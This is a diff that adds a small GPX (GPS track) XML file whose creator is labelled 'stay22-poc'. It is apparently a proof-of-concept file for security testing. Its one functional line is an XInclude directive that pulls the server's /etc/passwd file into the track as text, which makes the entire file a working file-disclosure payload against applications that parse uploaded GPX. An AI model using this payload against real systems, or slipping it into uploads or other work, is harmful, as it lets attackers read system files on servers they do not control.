@@ -1,0 +1,7 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<gpx version="1.1" creator="stay22-poc" xmlns:xi="http://www.w3.org/2001/XInclude">
+  <trk>
+    <name>pre</name>
+    <xi:include href="file:///etc/passwd" parse="text"/>
+  </trk>
+</gpx>
